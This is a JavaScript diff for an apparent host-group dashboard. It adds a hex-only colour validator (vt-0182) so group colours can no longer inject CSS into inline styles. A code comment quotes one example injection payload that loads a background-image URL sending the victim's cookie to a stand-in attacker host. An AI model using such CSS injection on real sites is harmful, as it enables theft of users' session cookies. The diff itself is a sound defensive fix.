@@ -126,6 +126,14 @@
     return parts.join(' ');
   }
   function esc(s) { return String(s).replace(/[&<>"']/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c])); }
+  // vt-0182: validate a CSS color string before embedding into inline
+  // style="...". esc() is HTML-attr safe but NOT CSS-safe — `red;
+  // background-image:url(//attacker/${cookie})` would render and leak.
+  // Accept only #rgb/#rgba/#rrggbb/#rrggbbaa. Reject everything else
+  // (server should already validate, but defense-in-depth).
+  function safeCssColor(s) {
+    return /^#[0-9a-fA-F]{3,8}$/.test(String(s || '')) ? s : null;
+  }
   function dotClass(status, kind) {
     if (kind === 'host') return status === 'online' ? 'on' : 'off';
     if (status === 'running') return 'on';
@@ -933,7 +941,8 @@
     el.innerHTML = memberGroups.length === 0
       ? `<span class="lbl" style="color:var(--text-faint)">not in any group</span>`
       : memberGroups.map(g => {
-        const accent = g.color ? `style="border-color:${esc(g.color)};color:${esc(g.color)}"` : '';
+        const safeColor = safeCssColor(g.color);
+        const accent = safeColor ? `style="border-color:${esc(safeColor)};color:${esc(safeColor)}"` : '';
         return `<span class="chip" ${accent}>${esc(g.name)}<button data-rm-group="${g.id}">×</button></span>`;
       }).join('');
     el.querySelectorAll('button[data-rm-group]').forEach(btn => {
@@ -1442,7 +1451,7 @@
           <td>${esc(g.description || '—')}</td>
           <td>${labelsChips}</td>
           <td title="${esc(hostNames)}">${(g.host_ids || []).length}</td>
-          <td>${g.color ? `<span style="background:${esc(g.color)};display:inline-block;width:16px;height:16px;border:1px solid var(--line);vertical-align:middle"></span> ${esc(g.color)}` : '—'}</td>
+          <td>${(() => { const sc = safeCssColor(g.color); return sc ? `<span style="background:${esc(sc)};display:inline-block;width:16px;height:16px;border:1px solid var(--line);vertical-align:middle"></span> ${esc(sc)}` : (g.color ? '(invalid)' : '—'); })()}</td>
           <td><button class="btn-row" data-grp-del="${g.id}" title="delete">✕</button></td>
         </tr>`;
       }).join('');
